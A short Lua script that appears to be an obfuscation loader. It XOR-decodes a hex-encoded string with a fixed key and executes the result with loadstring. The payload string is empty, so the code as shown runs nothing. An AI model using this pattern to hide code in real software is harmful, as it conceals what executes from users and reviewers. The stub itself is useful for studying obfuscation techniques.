local k={60,188,143,28,240,14,147,123,243,240,55,226,158,43,165,117,63,179,224,27,59,43,213,104,67,43,126,213,194,143,17,60}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
